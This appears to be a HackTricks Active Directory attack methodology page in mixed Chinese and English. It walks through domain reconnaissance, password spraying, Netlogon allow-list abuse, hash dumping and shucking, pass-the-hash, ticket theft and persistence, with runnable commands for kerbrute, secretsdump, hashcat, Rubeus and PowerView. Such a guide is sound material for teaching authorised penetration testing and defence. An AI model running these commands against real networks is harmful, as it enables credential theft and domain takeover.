# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使 **network administrators** 能够高效地创建和管理网络中的 **domains**、**users** 和 **objects**。它被设计为可扩展的，便于将大量用户组织为可管理的 **groups** 和 **subgroups**，同时在不同层级控制 **access rights**。

**Active Directory** 的结构由三层主要层级组成：**domains**、**trees** 和 **forests**。**domain** 包含一组对象，例如 **users** 或 **devices**，它们共享一个公共数据库。**trees** 是由共享结构连接起来的这些域的集合，而 **forest** 表示多个 tree 的集合，它们通过 **trust relationships** 相互连接，构成组织结构的最上层。每一层都可以指定特定的 **access** 和 **communication rights**。

**Active Directory** 中的关键概念包括：

1. **Directory** – 保存所有与 Active Directory 对象相关的信息。
2. **Object** – 指目录中的实体，包括 **users**、**groups** 或 **shared folders**。
3. **Domain** – 作为目录对象的容器，多个 domain 可以共存于一个 **forest** 中，每个 domain 都维护自己的对象集合。
4. **Tree** – 由共享相同根 domain 的多个 domain 组成的集合。
5. **Forest** – Active Directory 中组织结构的顶层，由多个 tree 组成，并通过它们之间的 **trust relationships** 连接。

**Active Directory Domain Services (AD DS)** 包含一系列对网络内集中管理和通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据，并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 负责安全 **digital certificates** 的创建、分发和管理。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 功能，使用户能够在一次会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过限制未经授权的分发和使用来帮助保护版权材料。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

更多详细说明请查看： [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要学会如何 **attack an AD**，你需要非常好地 **understand** **Kerberos authentication process**。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

你可以查看 [https://wadcoms.github.io/](https://wadcoms.github.io) 来快速了解有哪些命令可以用来枚举/exploit 一个 AD。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** 才能执行操作。若你尝试通过 IP address 访问一台机器，**它将使用 NTLM 而不是 kerberos**。

## Recon Active Directory (No creds/sessions)

如果你只有对 AD environment 的访问权限，但没有任何 credentials/sessions，你可以：

- **Pentest the network:**
- 扫描网络，查找机器和开放端口，并尝试 **exploit vulnerabilities** 或从中 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md).
- 枚举 DNS 可能会提供域中关键服务器的信息，例如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取更多关于如何执行此操作的信息。
- **Check for null and Guest access on smb services** (这在现代 Windows 版本上不起作用)：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 更详细的 SMB server 枚举指南可以在这里找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 更详细的 LDAP 枚举指南可以在这里找到（请 **特别注意 anonymous access**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集 credentials
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机
- 通过 [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 暴露来收集 credentials
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从域环境内以及公开可用的内部文档、社交媒体、服务（主要是 web）中提取用户名/姓名。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). 最常见的约定有：_NameSurname_、_Name.Surname_、_NamSur_（各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个随机字母加 3 个随机数字_（abc123）。
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，服务器会返回 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，从而让我们判断该 username 是无效的。**Valid usernames** 会返回 **AS-REP** 响应中的 **TGT**，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行 pre-authentication。
- **No Authentication against MS-NRPC**: 使用 auth-level = 1（No authentication）对域控制器上的 MS-NRPC（Netlogon）接口进行访问。该方法在绑定 MS-NRPC interface 后调用 `DsrGetDcNameEx2` 函数，以在没有任何 credentials 的情况下检查用户或计算机是否存在。 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了这种枚举方式。相关研究可见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) 服务器**

如果你在网络中找到了这些服务器之一，你还可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 和这个仓库 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 中找到用户名列表。
>
> 不过，你应该已经从你在此之前应执行的 recon 步骤中拿到了**在公司工作的人员姓名**。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 生成可能有效的 usernames。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

即使 **Zerologon** 已在 DC 上修补，显式加入 allow-list 的账户仍可能暴露于**旧版/易受攻击的 Netlogon secure-channel 行为**。有风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**，或者对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL security descriptor**（见 [Security Descriptors](security-descriptors.md)）。任何在 DACL 中被授予相关 ACE 的账户或组都可以成为目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上将 **Everyone** 加入 allow-list。

实操流程：

1. 通过检查 **SYSVOL/GPO** 和 **实时 DC registry**，识别被 allow-list 包含的主体。
2. 将 SDDL 中找到的 SIDs 解析为真实的 AD users/computers，并优先处理 **DC machine accounts**、**trust accounts** 以及其他特权机器。
3. 反复尝试以被 allow-list 的账户进行 **MS-NRPC / Netlogon authentication**。
4. 一旦猜测成功，就滥用 **Netlogon password-setting** 来重置目标账户密码（公开 PoC 会把它设为空字符串）。

来自公开 artifact 的快速排查 / lab 示例：
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** 有用，因为有效的 allow-list 可能存在于 **SYSVOL**、**registry**，或两者中。
- 这个 exploit path 本身很重要，因为一旦识别出易受攻击的 account，后续就**不需要 Domain Admin privileges**。
- 破坏像 `DC$` 这样的 **Domain Controller machine account** 尤其危险，因为重置该 password 可以直接启用更广泛的 **AD takeover** 路径。
- **Brute-force feasibility** 取决于模式：公开 artifact 描述了一个 meet-in-the-middle 方法、在有另一个 computer account 可用时进行的 **24-bit** brute force，以及更慢的 **32-bit** 变体。

Detection / hardening notes:

- 审计 allow-list policy，并移除除临时、明确必需的兼容性例外之外的所有内容。
- 监控 DC **System** events **5827/5828/5829/5830/5831**，以捕获被 policy 拒绝、发现或明确允许的 vulnerable Netlogon connections。
- 在遗留依赖移除之前，将 `VulnerableChannelAllowList` 中的 accounts 视为 **high-risk**。

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay 到 DC 被阻止**，因为 signing，仍然要探测 **LDAP** 状态：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。一个启用 SMB signing 但禁用 LDAP signing 的 DC，仍然是可用的 **relay-to-LDAP** 目标，可用于像 **SPN-less RBCD** 这样的 abuse。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UI 有时会在 HTML 中 **嵌入被掩码的 admin passwords**。查看源代码/devtools 可以恢复明文（例如，`<input value="<password>">`），从而用 Basic-auth 访问扫描/打印 repositories。
- 获取到的 print jobs 可能包含带有每个用户 passwords 的 **plaintext onboarding docs**。测试时要保持配对关系一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 active directory，你会获得**更多的邮件和对网络更好的理解**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**。**

### Looks for Creds in Computer Shares | SMB Shares

现在你已经有了一些基础凭证，你应该检查是否能在 AD 内**找到**任何**有趣的共享文件**。你可以手动做这件事，但这是一项非常无聊且重复的任务（如果你发现了成百上千份文档要检查，就更是如此）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你可以**访问其他 PC 或 shares**，你可以**放置文件**（比如 SCF file），如果它们被某种方式访问，就会**触发对你的 NTLM authentication**，这样你就可以**窃取** **NTLM challenge** 并破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

这个漏洞允许任何经过认证的用户**攻陷 domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory 上的权限提升 WITH privileged credentials/session

**对于以下技术，普通域用户还不够，你需要一些特殊的 privileges/credentials 才能执行这些攻击。**

### Hash extraction

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[本地提权](../windows-local-privilege-escalation/index.html) 成功**攻陷了一些本地 admin** 账户。\
然后，就该把内存中和本地的所有 hash dump 出来了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你拿到了某个用户的 hash**，就可以用它来**冒充**该用户。\
你需要使用某个**工具**来使用该 hash 执行 **NTLM authentication**，**或者**你也可以创建一个新的 **sessionlogon**，并把该 hash **注入**到 **LSASS** 中，这样当任何 **NTLM authentication** 被执行时，就会使用那个 hash。最后这个选项就是 mimikatz 所做的。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

这种攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为常见的通过 NTLM 协议进行 Pass The Hash 的替代方案。因此，在**禁用了 NTLM 协议**、只允许 **Kerberos** 作为认证协议的网络中，这种方法会尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者不是窃取用户的密码或 hash 值，而是**窃取用户的 authentication ticket**。然后使用这个被盗的 ticket 来**冒充用户**，从而获得网络内资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有一个**local administrator** 的 **hash** 或 **password**，你应该尝试用它**本地登录**到其他 **PCs**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意这会非常 **noisy**，而且 **LAPS** 可以 **mitigate** 它。

### MSSQL Abuse & Trusted Links

如果用户有 **access MSSQL instances** 的权限，他可能可以用它在 MSSQL 主机上 **execute commands**（如果以 SA 运行）、**steal** NetNTLM **hash**，甚至执行 **relay** **attack**。\
另外，如果某个 MSSQL instance 被另一个 MSSQL instance **trust**（database link）。如果用户对被 trust 的数据库有权限，他就能够 **use the trust relationship to execute queries also in the other instance**。这些 trust 可以链式组合，在某个时刻，用户可能会找到一个配置错误的数据库，并能在其中执行命令。\
**数据库之间的 links 即使跨 forest trusts 也能工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方 inventory 和 deployment 套件通常会暴露通往 credentials 和 code execution 的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你找到任何带有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 的 Computer object，并且你在该 computer 上拥有 domain privileges，你就能够从登录到这台 computer 的每个用户的内存中 dump 出 TGTs。\
因此，如果 **Domain Admin 登录到这台 computer**，你就可以 dump 他的 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以 **自动 compromise 一个 Print Server**（希望它是一台 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果一个 user 或 computer 被允许进行 "Constrained Delegation"，它就能够 **impersonate any user to access some services in a computer**。\
然后，如果你 **compromise 了这个 user/computer 的 hash**，你就可以 **impersonate any user**（甚至 domain admins）去访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程 computer 的 Active Directory object 上拥有 **WRITE** 权限，就可以实现带有 **elevated privileges** 的 code execution：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被 compromise 的 user 可能对某些 domain objects 拥有一些 **interesting privileges**，这可能让你后续进行 **move** lateral/**escalate** privileges。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现一个正在 **listening** 的 **Spool service**，可以被 **abused** 来 **acquire new credentials** 并 **escalate privileges**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果 **other users** **access** 了这台 **compromised** machine，就有可能 **gather credentials from memory**，甚至向他们的进程中 **inject beacons** 来冒充他们。\
通常用户会通过 RDP 访问系统，所以这里有一些针对第三方 RDP sessions 的攻击方法：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一种用于管理域加入计算机上 **local Administrator password** 的系统，确保它是 **randomized**、唯一且会被频繁 **changed**。这些密码存储在 Active Directory 中，并通过 ACLs 仅允许授权用户访问。只要有足够权限读取这些密码，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被 compromise 的机器上 **Gathering certificates** 可能是在环境内部提升权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了 **vulnerable templates**，就可以 abuse 它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 甚至更好的 **Enterprise Admin** 权限，就可以 **dump** **domain database**：_ntds.dit_。

[**关于 DCSync attack 的更多信息可在此查看**](dcsync.md)。

[**关于如何 steal NTDS.dit 的更多信息可在此查看**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前面讨论的某些技术可以用于 persistence。\
例如你可以：

- 让用户对 [**Kerberoast**](kerberoast.md) 变得脆弱

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 让用户对 [**ASREPRoast**](asreproast.md) 变得脆弱

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 给用户授予 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 会利用 **NTLM hash**（例如 **PC account 的 hash**）为某个特定服务创建一个 **legitimate Ticket Granting Service (TGS) ticket**。这种方法用于 **access the service privileges**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 指的是攻击者在 Active Directory (AD) 环境中获取 **krbtgt account 的 NTLM hash**。这个账户很特殊，因为它用于对所有 **Ticket Granting Tickets (TGTs)** 进行签名，而这些票据是 AD 网络内认证所必需的。

一旦攻击者拿到这个 hash，就可以为任意选择的账户创建 **TGTs**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

